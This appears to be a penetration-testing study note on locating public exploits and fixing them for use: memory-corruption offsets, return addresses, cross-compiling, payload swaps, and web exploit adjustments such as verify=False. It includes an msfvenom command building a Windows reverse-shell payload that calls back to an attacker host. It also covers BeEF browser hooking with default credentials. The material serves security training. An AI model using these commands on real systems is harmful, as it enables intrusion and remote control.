# Exploits 

### Locating Public Exploits

Online exploit resources:
- The Exploit Database
- The SecurityFocus Exploit Archives
- Packet Storm
- Google search (i.e. `firefox --search "Microsoft Edge site:exploit-db.com"`) -- use extreme caution when using exploits from non-curated resources 

Offline exploit resources:
- SearchSploit (i.e. `searchsploit <query>`)
- Nmap NSE Scripts (i.e. `cd /usr/share/nmap/scripts && grep Exploits *.nse`)
	- once you find a script: `nmap --script-help=<exploit_script>.nse`
- The Browser Exploitation Framework (BeEF) 
	- a) start BeEF: `sudo beef-xss`
	- b) login to web interface using credentials `beef:beef` (i.e. `http://127.0.0.1:3000/ui/panel`)
	- c) hook a target browser 
	- d) navigate to the Hooked Browsers panel of the BeEF console 
	- e) click on the target and navigate to the Commands tab to find various enumeration and exploits 
- The Metasploit Framework
	- i.e. `sudo msfconsole` -> `search <exploit>`


<br> 

### Fixing Exploits 

#### Fixing Memory Corruption Exploit 

> Generally, a standard stack overflow (in applications running in user mode without mitigations such as DEP and ASLR), the exploit will
> 1. Create a large buffer to trigger the overflow.
> 2. Take control of EIP by overwriting a return address on the stack by padding the large buffer with an appropriate offset.
> 3. Include a chosen payload in the buffer prepended by an optional NOP sled.
> 4. Choose a correct return address instruction such as JMP ESP (or different register) in order to redirect the execution flow into our payload.

> Based on this, when fixing an exploit you may need to change the buffer size as additional paths, IP addresses, etc. may effect the EIP offset. You may need to change the return address or verify the one in the exploit is correct by cloning the target environment locally and using a debugger on the vulnerable software to obtain a memory address of a return address instruction. And, finally, you may need to change the payload of the exploit to account for your IP address and port numbers.

1. importing and examining the exploit 
	- with SearchSploit you can copy (mirror) an exploit with the `-m` option or examine it with `-x` (i.e. `searchsploit -m <exploit_id>`)
	- examining the exploit should reveal any modifications that are required to compile the exploit and make it work in your target environment 
2. cross-compiling exploit code
	- where possible it is recommended to use native compilers for the specific OS targeted by an exploit to avoid compilation issues 
	- if this is not possible, you can use a cross-compiler (i.e. `mingw-64`) to compile code into a Windows PE file from within Kali 
	- a) first, compile the exploit code to see if there are any errors 
		- i.e. `i686-w64-mingw32-gcc 42341.c -o exploit.exe`
	- b) if there are errors then Google them and resolve them with `mingw-64`'s options
		- i.e. if the winsock.h library is required run: `i686-w64-mingw32-gcc 42341.c -o exploit.exe -lws2_32`
3. changing the socket information 
	- if the exploit targets a remotely-accessible vulnerability (most likely), then you'll need to inspect the code to see where hard-coded values for the IP address and port number are so you can adjust them 
	- otherwise, the exploit may allow you to enter these values on the command line
4. changing the return address 
	- after creating a local clone of the target environment and inspecting the loaded modules for the application in a debugger you discover that the return address in the exploit is missing (i.e. the DLL it uses is absent), you will need to find a different return address
	- this can be done through the local clone of the target environment using a debugger 
	- if this is not possible, you could use information from other publicly available exploit to get a reliable return address that will match your target environment (i.e looking at exploits which target different vulnerabilities in the target OS) -- note, this method is less reliable and vary widely depending on the protections the operating system has installed
	- if you have access to the target as an unprivileged user, and want to elevate your privileges, you can copy the DLLs that you are of interested into your attack machine and use tools such as disassemblers or `msfpescan` to obtain a reliable return address
5. changing the payload 
	- once you find the payload in the exploit source code, you can replace it by generating your own shellcode with `msfvenom`, making sure to exclude bad characters
	- i.e. `msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c â€“e x86/shikata_ga_nai -b \x00\x0a\x0d\x25\x26\x2b\x3d"`
6. recompile the exploit code with the modifications you made (see step 2) and test it 
	- if running a Windows exploit on Kali machine you need to use the `wine` program (i.e. `wine exploit.exe`)
7. changing the buffer 
	- you may need to change the length of the buffer you use to trigger the overflow if the modifications you have made effect the EIP offset 
	- this can be done by analyzing the source code of the exploit and matching the EIP address in the your debugger to that of the one you set for the return address 

<br> 

#### Fixing Web Exploits 

> Web application exploits are usually significantly easier to re-purpose than memory corruption exploits as you don't have to deal with hex-encoded payloads or OS protections. However, it is important to read the exploit and understand what considerations must be taken. These include:
> - Does the exploit initiate an HTTP or HTTPS connection?
> - Does it access a web application specific path or route?
> - Does the exploit leverage a pre-authentication vulnerability?
> - If not, how does the exploit authenticate to the web application?
> - How are the GET or POST requests crafted to trigger and exploit the vulnerability?
> - Does it rely on default application settings (such as the web path of the application) that may have been changed after installation?
> - Will oddities such as self-signed certificates disrupt the exploit?

1. selecting the vulnerability
	- it is important to select a vulnerability relevant to the information you have already enumerated (i.e. the application version, if you already have authentication credentials for the service, etc.)
2. changing connectivity information 
	- when you inspect the code you may need to change variables such as; IP addresses, HTTP to/from HTTPS, URLs, credentials used etc.
	- if a SEC_ERROR_UNKNOWN_ISSUER error is generated then the certificate on the remote host could not be validated and you will need to account for this in the exploit code
	- specifically, if the exploit uses the `requests` Python library to communicate with the target you need to add the `verify=False` option to any request (i.e. `response = requests.post(url, data=data, allow_redirects=False, verify=False)`)
3. if when now running the exploit an error is generated you need to troubleshoot this 
	- i.e. if an "index out of range"  you can use the Python error to see where this is
	- if you see it's caused by a hard-coded parameter (i.e. `csrf_param = "__c"`) then you can use `print` statements (in Python) to see what the code is actually doing and if this matches the response returned by the web server 
	- for example, if the hard-coded CSRF parameter is `__c` but the server is returning `_sk_` then you can replace this hard-coded parameter and try the exploit again 